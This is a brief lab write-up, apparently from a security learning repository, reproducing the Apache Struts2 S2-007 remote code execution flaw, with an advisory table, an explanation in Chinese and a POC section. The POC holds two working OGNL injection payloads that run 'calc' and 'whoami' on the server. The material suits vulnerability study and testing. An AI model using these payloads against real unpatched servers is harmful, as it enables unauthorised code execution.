# S2-007 Demo

## Summary

| Impact of vulnerability | Remote Code Execution                                        |
| :---------------------- | ------------------------------------------------------------ |
| Maximum security rating | Important                                                    |
| Recommendation          | Developers should either upgrade to [Struts 2.2.3.1](http://struts.apache.org/download.cgi#struts2231) or apply the configuration changes described below |
| Affected Software       | Struts 2.0.0 - Struts 2.2.3                                  |
| Original JIRA Tickets   | [WW-3668](https://issues.apache.org/jira/browse/WW-3668)     |
| Reporter                | Hideyuki Suzumi                                              |
| CVE Identifier          | -                                                            |

## Problem

当配置了验证规则 `<ActionName>-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析，从而造成远程代码执行。 

## Environment

| Struts2 Version | struts-2.2.3           |
| --------------- | ---------------------- |
| Server          | Tomcat 8.5.53          |
| IDE             | idea 2020.1.1 ULTIMATE |

## POC



![{A7084584-483F-4AA5-A99E-B1B26E8A911B}_20200619183031]({A7084584-483F-4AA5-A99E-B1B26E8A911B}_20200619183031.jpg)

payload:

- open `calc.exe`

  ```java
  ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("calc")) + '
  ```

- run command

  ```java
  ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '
  ```

## Reference

- [S2-007 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md)


* [【Struts2-命令-代码执行漏洞分析系列】S2-007](https://xz.aliyun.com/t/2684)

* [S2-007](https://cwiki.apache.org/confluence/display/WW/S2-007)